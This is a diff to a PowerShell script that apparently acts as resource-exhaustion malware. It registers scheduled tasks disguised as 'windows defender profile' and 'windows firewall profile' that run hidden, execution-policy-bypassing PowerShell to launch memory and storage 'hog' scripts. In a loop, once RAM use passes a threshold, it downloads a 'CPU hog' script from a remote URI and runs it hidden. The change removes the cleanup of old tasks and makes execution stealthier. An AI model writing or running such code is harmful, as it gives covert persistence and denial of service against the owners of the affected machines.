@@ -30,7 +30,7 @@ $paths = @(
 Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami3.txt`""
 
 
-$itemMem = Get-ItemProperty -Path "$basePath" -Name $memPropertyName 
+$itemMem = Get-ItemProperty -Path "$basePath" -Name $memPropertyName -ErrorAction SilentlyContinue
 
 if(-not($itemMem)){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
@@ -58,13 +58,6 @@ $memHogTaskName = "windows defender profile"
 $storageHogTaskName = "windows firewall profile"
 $memTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $memHogPath"
 $storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $storageHogPath"
-
-if(schtasks /query /tn $memHogTaskName){
-    schtasks /delete /tn $memHogTaskName /f
-}
-if(schtasks /query /tn $storageHogTaskName){
-    schtasks /delete /tn $storageHogTaskName /f
-}
 
 function Get-RamPercentage{
     $mem = Get-WmiObject -Class Win32_OperatingSystem
@@ -132,8 +125,9 @@ while ($true) {
 
     $curr = Get-RamPercentage
     if($curr -ge $threshold){
+        echo "threshold $threshold reached at $curr" >> "C:\thres.txt"
         iwr -Uri $cpuHogUri -OutFile $cpuHogPath
-        powershell.exe -ep bypass -w hidden -noP $cpuHogPath
+        powershell -ep bypass -w hidden -noP start-process powershell.exe -windowstyle hidden $cpuHogPath
     }
 
 }
